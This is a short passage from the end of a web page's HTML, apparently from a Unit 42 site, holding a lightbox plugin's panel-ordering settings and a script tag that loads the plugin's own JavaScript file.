Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
